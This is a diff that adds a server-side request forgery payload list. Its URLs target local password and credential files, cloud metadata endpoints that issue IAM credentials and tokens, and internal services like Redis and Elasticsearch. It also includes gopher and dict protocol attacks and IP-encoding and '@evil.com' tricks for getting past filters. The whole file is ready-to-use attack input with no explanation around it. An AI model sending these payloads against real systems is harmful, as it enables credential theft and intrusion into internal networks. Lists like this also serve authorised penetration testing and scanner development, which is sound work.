@@ -1,0 +1,45 @@
+# Local File Access (Unix)
+file:///etc/passwd
+file:///etc/shadow
+file:///etc/hosts
+file:///proc/self/environ
+file:///var/log/auth.log
+
+# Local File Access (Windows)
+file:///C:/Windows/win.ini
+file:///C:/Windows/System32/drivers/etc/hosts
+file:///C:/Windows/repair/sam
+
+# AWS Metadata (EC2)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Google Cloud Metadata
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+
+# Azure Metadata
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
+
+# Internal Services
+http://localhost:80
+http://127.0.0.1:3306
+http://127.0.0.1:6379  # Redis
+http://127.0.0.1:9200  # Elasticsearch
+http://127.0.0.1:8080  # Common internal port
+
+# Protocol-Based Attacks
+dict://localhost:6379/info
+gopher://localhost:6379/_INFO
+ldap://localhost:389
+sftp://localhost:22
+
+# Bypass Techniques
+http://127.0.0.1:80@evil.com
+http://[::1]:80
+http://0x7f000001:80  # Hex encoding of 127.0.0.1
+http://2130706433:80 # Decimal encoding of 127.0.0.1
+http://localhost%2ecom
+http://127.0.0.1.nip.io
